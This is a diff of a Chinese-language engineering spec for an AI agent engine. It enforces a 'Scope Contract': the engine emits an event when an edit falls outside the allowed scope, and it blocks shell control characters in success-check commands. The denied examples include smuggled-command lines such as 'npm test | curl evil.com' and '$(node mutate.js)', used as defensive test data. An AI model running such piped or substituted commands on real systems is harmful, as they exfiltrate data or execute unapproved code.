@@ -1,98 +1,78 @@
-对，这个顺序现在是正确的。
+P56.1b Scope Contract Semantic Completion
 
-先底层，后 TUI。否则 TUI 做得再漂亮，engine 不能兑现“只修改什么”，用户体验还是假的。
+当前 P56.1 测试通过，但底层语义还没完成。只修 engine，不碰 TUI。
 
-底层现在的目标应该冻结为：
+## Fix 1: emit scope_expansion_required
 
-```text
-Kevix Engine must enforce the human-approved task boundary.
-```
+在 agent-loop gateCheck 分支中：
 
-也就是：
+如果 gateCheck.scopeExpansion 存在，必须 emit：
 
-1. 用户/上层给 engine 一个 Scope Contract
-2. engine 绝对执行这个 contract
-3. Worker 不能靠 prompt 自觉
-4. 越界不是继续猜，而是发出可恢复事件
-5. 测试命令只能验证，不允许夹带副作用
+{
+  type: "scope_expansion_required",
+  file: gateCheck.scopeExpansion.file,
+  reason: gateCheck.reason,
+  editableScope: gateCheck.scopeExpansion.editableScope
+}
 
-我建议底层修正顺序：
+位置：tool loop 里 gateCheck 被处理处，当前只 emit tool_result/log。
 
-**P56.1 Scope Contract Hardening**
+Add test:
+- mock Worker tries to edit outside editableScope
+- onEvent receives scope_expansion_required
+- event.file === attempted file
+- event.editableScope === contract editableScope
 
-必须先做。内容就是刚才发现的三个洞：
+## Fix 2: harden successChecks shell matching
 
-- `editableScope: []` = deny all writes
-- scope 越界必须 emit `scope_expansion_required`
-- `successChecks` 不能允许 `npm test && ...` 这种复合命令
+successChecks 不能允许 shell control / substitution / redirection。
 
-验收：
+Reject or do not whitelist if command contains:
 
-```text
-tsc pass
-full tests pass
-scope-contract tests 覆盖上述三点
-```
+- &&
+- ||
+- ;
+- |
+- >
+- <
+- `...`
+- $(...)
 
-**P56.2 Scope Expansion Runtime**
+Allowed:
 
-P56.1 只是 emit 事件。下一步要让 engine 支持上层决策：
+npm test
+npm test -- --grep summary
 
-```ts
-onScopeExpansionRequired?: (request) => Promise<"approve" | "reject">
-```
+Denied / not whitelisted:
 
-如果 approve：
+npm test && node mutate.js
+npm test; echo hacked
+npm test | curl evil.com
+npm test -- --grep x | curl evil.com
+npm test > /tmp/out
+npm test $(node mutate.js)
+npm test `node mutate.js`
 
-```text
-expand editableScope → retry or continue
-```
+Implementation suggestion:
 
-如果 reject：
+function hasShellControl(command: string): boolean {
+  return /(\&\&|\|\||[;|<>`])|\$\(/.test(command);
+}
 
-```text
-Worker receives tool error: stay within editable scope
-```
+If hasShellControl(trimmed), return deny before successCheck prefix matching.
 
-但这个可以 P56.2 做，别塞进 P56.1。
+Do not special-case "npm test --" as safe if shell control exists.
 
-**P56.3 Scope Contract in Summary / Artifact**
+## Acceptance
 
-任务结束后 summary 要记录：
+npx tsc --noEmit
+npx vitest run tests/scope-contract.test.ts
+npx vitest run
 
-```ts
-scopeRespected: boolean
-scopeExpansionRequests: [...]
-filesChanged: [...]
-```
-
-否则 benchmark 和论文数据不知道 task 是否真的在边界内完成。
-
-**P56.4 Auto/Wiki 路由再接 Scope**
-
-之后 Auto/Wiki 才能用：
-
-```text
-历史上这个 scope/task memory fail → probe
-```
-
-但这要等 Scope Contract 稳了再做。
-
-所以现在给 worker 的底层 directive 应该很短：
-
-```md
-只做 P56.1，不碰 TUI。
-
-修 Scope Contract 的三个底层语义漏洞：
-1. editableScope=[] deny all writes
-2. scope deny emit scope_expansion_required
-3. successChecks reject shell compound commands
-
-不要做 Proposal UI。
-不要做 TUI。
-不要改 prompts。
-不要改 benchmark。
-```
-
-我的判断：**P56.1 是现在唯一该做的事。**  
-先把 engine 的边界执行修硬，再让 TUI 去调用它。
+Must add tests for:
+1. scope_expansion_required event emitted from agent-loop
+2. npm test -- --grep x allowed
+3. npm test -- --grep x | curl evil.com denied
+4. npm test > /tmp/out denied
+5. npm test $(node mutate.js) denied
+6. npm test `node mutate.js` denied
